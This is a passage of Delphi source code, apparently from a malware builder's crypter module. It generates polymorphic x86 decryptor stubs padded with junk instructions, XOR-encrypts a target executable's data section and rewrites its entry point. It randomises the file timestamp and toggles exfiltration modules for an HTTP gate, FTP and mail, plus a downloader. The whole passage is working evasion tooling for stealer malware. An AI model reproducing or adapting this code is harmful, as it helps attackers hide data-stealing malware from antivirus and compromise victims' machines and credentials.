          -dword(dword(CryptDecryptorRaw)-dword(CryptDecryptorRaw_old){size})+dword(CryptVA);
        cb[01]:=$33;cb[02]:=$C0+8*b2+b2;
        cb[03]:=$0F;cb[04]:=$84;cb[05]:=$00;cb[06]:=$00;cb[07]:=$00;cb[08]:=$00;
        MoveMemory(@cb[05],@dd,sizeof(dd));
        MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);
        inc(CryptDecryptorRaw,csize);
      end;
    // sub %reg%, %reg% / jz 401038
    3:
      begin
        csize:=8;
        repeat
        b2:=reg_random(32);
        until (b2 in [0..3]) or (b2 in [6..7]);
          dd:=-8{2:sizeof 1st SUB,6:sizeof 2nd JZ}-dword(CryptDecryptorVA)
          -dword(CryptDecryptorRaw-CryptDecryptorRaw_old{size})+dword(CryptVA);
        cb[01]:=$2B;cb[02]:=$C0+8*b2+b2;
        cb[03]:=$0F;cb[04]:=$84;cb[05]:=$00;cb[06]:=$00;cb[07]:=$00;cb[08]:=$00;
        MoveMemory(@cb[05],@dd,sizeof(dd));
        MoveMemory(pointer(CryptDecryptorRaw), @cb, csize);
        inc(CryptDecryptorRaw,csize);
      end;
  end;


  CryptDecryptorRaw:=CryptDecryptorRaw+TrashAddRndSize(CryptDecryptorRaw,_ESP,TRASH_IDGAF,TRASH_SIZE_RANDOM);
end;

procedure CryptCodeWriteDecryptor(fn:string);
var
  i,EPSectRaw_tmp: dword;
  b:byte;
begin
  randomize;
  hFile:=CreateFile(pchar(fn), GENERIC_READ or GENERIC_WRITE,
                     FILE_SHARE_READ or FILE_SHARE_WRITE,
                     nil, OPEN_EXISTING,
                     FILE_ATTRIBUTE_NORMAL, 0);
  if hFile=INVALID_HANDLE_VALUE then exit;
  FileSize := GetFileSize (hFile, nil);

  hMap:=CreateFileMapping(hFile, nil, PAGE_READWRITE, 0, FileSize, nil);
  if hMap=0 then exit;
  hMapFile:=dword(MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0));
  if hMapFile=0 then exit;

  idh := PImageDosHeader (hMapFile);
  ifh := PImageFileHeader (hMapFile + dword(idh._lfanew) + 4);
  ioh := PImageOptionalHeader (cardinal(ifh) + IMAGE_SIZEOF_FILE_HEADER);
  ish := PSectionsArray (cardinal(ioh) + IMAGE_SIZEOF_NT_OPTIONAL_HEADER);

  // GET EP&DATA SECTION
  EPSect:=0;
  DataSect:=0;
  for i := 0 to ifh.NumberOfSections-1 do
  begin
    if (ish[i].VirtualAddress<=ioh.AddressOfEntryPoint) and (ish[i].VirtualAddress+ish[i].Misc.VirtualSize>ioh.AddressOfEntryPoint) then
    begin
      EPSect:=i;
    end;
    if ((ish[i].Name[0]=ord('.'))  and
        (ish[i].Name[1]=ord('d'))  and
        (ish[i].Name[2]=ord('a'))  and
        (ish[i].Name[3]=ord('t'))  and
        (ish[i].Name[4]=ord('a'))) then
    begin
      DataSect:=i;
    end;
  end;
  EPSectRaw:=ish[EPSect].PointerToRawData+hMapFile;
  DataSectRaw:=ish[DataSect].PointerToRawData+hMapFile;
  // GET DATAS FROM STUB
  EPSectRaw_tmp:=EPSectRaw;
  MoveMemory(@CryptVA, pointer(EPSectRaw_tmp), 4);             inc(EPSectRaw_tmp,4);
  MoveMemory(@CryptSize, pointer(EPSectRaw_tmp), 4);           inc(EPSectRaw_tmp,4);
  // GET RELOCS
  MoveMemory(@reloc_cnt, pointer(EPSectRaw_tmp), 4);           inc(EPSectRaw_tmp,4);
  reloc_RAW:=EPSectRaw_tmp;
  for i:=1 to reloc_cnt do
  begin
    MoveMemory(@relocs[i-1].reloc, pointer(EPSectRaw_tmp), 4); inc(EPSectRaw_tmp,4);
    MoveMemory(@relocs[i-1].size, pointer(EPSectRaw_tmp), 4);  inc(EPSectRaw_tmp,4);
  end;
  // Generate DATA XOR key
  for i:=0 to sizeof(DATA_XOR_KEY)-1 do
  begin
    DATA_XOR_KEY[i]:=random(256);
  end;
  // Get DATA size and write DATA_XOR_KEY
  MoveMemory(@DATA_XOR_SIZE, pointer(EPSectRaw_tmp), 4);       inc(EPSectRaw_tmp,4);
  MoveMemory(pointer(EPSectRaw_tmp), @DATA_XOR_KEY, 16);     //inc(EPSectRaw_tmp,16);
  // Xor data
  for i:=0 to DATA_XOR_SIZE-1 do
  begin
    MoveMemory(@b, pointer(DataSectRaw), sizeof(b));
    b:=b xor ord(DATA_XOR_KEY[(i) mod 16]);
    MoveMemory(pointer(DataSectRaw), @b, sizeof(b));           inc(DataSectRaw,sizeof(b));
  end;
  // Calculate addresses
  CryptDecryptorVA:=CryptVA+CryptSize;
  CryptDecryptorRaw := CryptDecryptorVA-ioh.ImageBase-ish[EPSect].VirtualAddress+EPSectRaw;
  // Get Old EntryPoint's VA and Raw
  OldEPVA:=ioh.AddressOfEntryPoint+ioh.ImageBase;
  CryptRaw:=CryptVA - ioh.ImageBase - ish[EPSect].VirtualAddress + EPSectRaw;
  // Calculate ZFE/TFE addresses
  gate_send_raw:=relocs[0].reloc-ioh.ImageBase-ish[EPSect].VirtualAddress+EPSectRaw;
  gate_send_size:=relocs[0].size;
  ftp_send_raw:=relocs[1].reloc-ioh.ImageBase-ish[EPSect].VirtualAddress+EPSectRaw;
  ftp_send_size:=relocs[1].size;
  mail_send_raw:=relocs[2].reloc-ioh.ImageBase-ish[EPSect].VirtualAddress+EPSectRaw;
  mail_send_size:=relocs[2].size;
  dloader_raw:=relocs[3].reloc-ioh.ImageBase-ish[EPSect].VirtualAddress+EPSectRaw;
  dloader_size:=relocs[3].size;
  // ZFE/TFE Routine
  if not bs.use_gate then
  fillchar(dword(pointer(gate_send_raw)^),gate_send_size,$90);
  //TrashAddRndSize(gate_send_raw,0,TRASH_SLON,gate_send_size);
  if not bs.use_ftp then
  fillchar(dword(pointer(ftp_send_raw)^),ftp_send_size,$90);
  //TrashAddRndSize(ftp_send_raw,0,TRASH_SLON,ftp_send_size);
  if not bs.use_mail then
  fillchar(dword(pointer(mail_send_raw)^),mail_send_size,$90);
  //TrashAddRndSize(mail_send_raw,0,TRASH_SLON,mail_send_size);
  if bs.dload_fc = 0 then
  fillchar(dword(pointer(dloader_raw)^),dloader_size,$90);
  //TrashAddRndSize(dloader_raw,0,TRASH_SLON,dloader_size);
  // Morph code & Generate decryptor
  StubGenerate;
  // Fix relocs in mapped file
  for i:=1 to reloc_cnt do
  begin
    MoveMemory(pointer(reloc_RAW), @relocs[i-1].reloc, 4);   inc(reloc_RAW,4);
    MoveMemory(pointer(reloc_RAW), @relocs[i-1].size, 4);    inc(reloc_RAW,4);
  end;
  // SET NEW EP
  ioh.AddressOfEntryPoint:=CryptDecryptorVA - ioh.ImageBase;
  // Set Random TimeStamp
  ifh.TimeDateStamp:=random(-1);
  // Deinit shit
  UnmapViewOfFile(pointer(hMapFile));
  CloseHandle(hMap);
  CloseHandle(hFile);
end;

end.

